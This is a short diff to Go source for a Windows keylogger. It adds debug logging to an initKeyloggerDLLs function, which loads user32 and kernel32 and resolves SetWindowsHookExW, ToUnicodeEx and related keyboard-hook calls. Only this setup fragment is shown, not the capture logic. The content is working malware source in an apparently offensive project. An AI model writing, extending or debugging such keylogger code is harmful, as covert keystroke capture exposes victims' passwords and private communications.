@@ -26,11 +26,16 @@ var (
 )
 
 func initKeyloggerDLLs() {
+	log.Printf("[DEBUG] initKeyloggerDLLs: Starting DLL initialization")
 	if user32DLL != nil {
+		log.Printf("[DEBUG] initKeyloggerDLLs: Already initialized")
 		return // Already initialized
 	}
+	log.Printf("[DEBUG] initKeyloggerDLLs: Loading user32.dll")
 	user32DLL = syscall.NewLazyDLL("user32.dll")
+	log.Printf("[DEBUG] initKeyloggerDLLs: Loading kernel32.dll")
 	kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
+	log.Printf("[DEBUG] initKeyloggerDLLs: Loading procs")
 	procSetWindowsHookEx = user32DLL.NewProc("SetWindowsHookExW")
 	procCallNextHookEx = user32DLL.NewProc("CallNextHookEx")
 	procUnhookWindowsHookEx = user32DLL.NewProc("UnhookWindowsHookEx")
@@ -40,6 +45,7 @@ func initKeyloggerDLLs() {
 	procToUnicodeEx = user32DLL.NewProc("ToUnicodeEx")
 	procGetKeyboardLayout = user32DLL.NewProc("GetKeyboardLayout")
 	procMapVirtualKey = user32DLL.NewProc("MapVirtualKeyW")
+	log.Printf("[DEBUG] initKeyloggerDLLs: Completed successfully")
 }
 
 const (
